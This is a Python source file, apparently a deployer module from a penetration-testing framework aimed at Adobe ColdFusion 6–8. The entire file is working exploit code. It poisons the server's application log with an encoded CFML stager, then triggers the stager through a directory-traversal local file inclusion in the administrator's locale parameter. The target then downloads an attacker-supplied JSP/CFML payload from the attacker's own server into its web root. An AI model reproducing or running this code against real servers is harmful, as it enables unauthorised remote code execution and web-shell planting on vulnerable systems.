from src.platform.coldfusion.interfaces import CINTERFACES
from src.module.deploy_utils import parse_war_path, _serve, waitServe, killServe
from threading import Thread
from base64 import b64encode
from os.path import abspath
from urllib import quote_plus
from requests import get
from log import LOG
import state
import utility

title = CINTERFACES.CFM
versions = ['6.0', '7.0', '8.0'] 
def deploy(fingerengine, fingerprint):
    """ Exploits log poisoning to inject CFML stager code that pulls
    down our payload and stashes it in web root
    """            

    cfm_path = abspath(fingerengine.options.deploy)
    cfm_file = parse_war_path(cfm_path, True)
    dip = fingerengine.options.ip

    base = 'http://{0}:{1}/'.format(dip, fingerprint.port)
    stager = "<cfhttp method='get' url='#ToString(ToBinary('{0}'))#'"\
              " path='#ExpandPath(ToString(ToBinary('Li4vLi4v')))#'"\
              " file='{1}'>"

    # ensure we're deploying a valid filetype
    extension = cfm_file.rsplit('.', 1)[1]
    if extension.lower() not in ['jsp', 'cfml']:
        utility.Msg("This deployer requires a JSP/CFML payload", LOG.ERROR)
        return

    # start up our local server to catch the request
    server_thread = Thread(target=_serve, args=(cfm_path,))
    server_thread.start()

    # inject stager
    utility.Msg("Injecting stager...")
    b64addr = b64encode('http://{0}:{1}/{2}'.format(utility.local_address(), 
                                             state.external_port,cfm_file))
    stager = quote_plus(stager.format(b64addr, cfm_file))
 
    stager += ".cfml" # trigger the error for log injection
    _ = utility.requests_get(base + stager)

    # stager injected, now load the log file via LFI
    if fingerprint.version in ["9.0", "10.0"]:
        LinvokeLFI(base, fingerengine, fingerprint)
    else:
        invokeLFI(base, fingerengine, fingerprint) 

    if waitServe(server_thread):
        utility.Msg("{0} deployed at /{0}".format(cfm_file), LOG.SUCCESS)
    else:
        utility.Msg("Failed to deploy file.", LOG.ERROR)
        killServe()

def invokeLFI(base, fingerengine, fingerprint):            
    """ Invoke the LFI based on the version
    """

    ver_dir = { "6.0" : "CFusionMX\logs\\application.log",
                "7.0" : "CFusionMX7\logs\\application.log",
                "8.0" : "ColdFusion8\logs\\application.log",
                "JRun" : "JRun4\servers\cfusion\cfusion-ear\cfusion-war"\
                         "\WEB-INF\cfusion\logs\\application.log"
              }

    uri = "/CFIDE/administrator/enter.cfm?locale={0}" + \
                            ver_dir[fingerprint.version] + "%00en"

    if checkURL(fingerengine, base + uri, "Severity"):
        return True

    else:
        # try JRun
        uri = "/CFIDE/administrator/enter.cfm?locale={0}" + \
                            ver_dir['JRun'] + '%00en'
        if checkURL(fingerengine, base + uri, "Severity"):
            return True


def LinvokeLFI(base, fingerengine, fingerprint):
    """ Currently unsupported; need to turn LFD into LFI
    """

    paths = []
    uri = "/CFIDE/adminapi/customtags/l10n.cfm?attributes.id=it"\
          "&attributes.file=../../administrator/mail/download.cfm"\
          "&filename={0}&attributes.locale=it&attributes.var=it"\
          "&attributes.jscript=false&attributes.type=text/html"\
          "&attributes.charset=UTF-8&thisTag.executionmode=end"\
          "&thisTag.generatedContent=htp"

    if fingerengine.options.remote_os == 'linux':
        paths.append('opt/coldfusion/cfusion/logs/application.log')
        if fingerprint.version == "9.0":
            paths.append('opt/coldfusion9/cfusion/logs/application.log')
        else:
            paths.append('opt/coldfusion10/cfusion/logs/application.log')

    else:
        paths.append('ColdFusion\logs\\application.log')
        if fingerprint.version == "9.0":
            paths.append('ColdFusion9\logs\\application.log')
            paths.append('ColdFusion9\cfusion\logs\\application.log')
        else:
            paths.append('ColdFusion10\logs\\application.log')
            paths.append('ColdFusion10\cfusion\logs\\application.log')
            
    for path in paths:

        luri = uri.format("{0}" + path)
        if checkURL(fingerengine, base + luri, 'Severity'):
            print luri
            return True
       

def checkURL(fingerengine, url, keyword):
    """ Inject traversal markers into the URL.  Applying
    a floor of 7 and ceiling of 12, as this seems to be the most likely range.
    """

    for dots in range(7, 12):
        
        if fingerengine.options.remote_os == 'linux':
            t_url = url.format("../" * dots)
        else:
            t_url = url.format("..\\" * dots)

        response = utility.requests_get(t_url)
        if response.status_code == 200 and keyword in response.content:
            return True
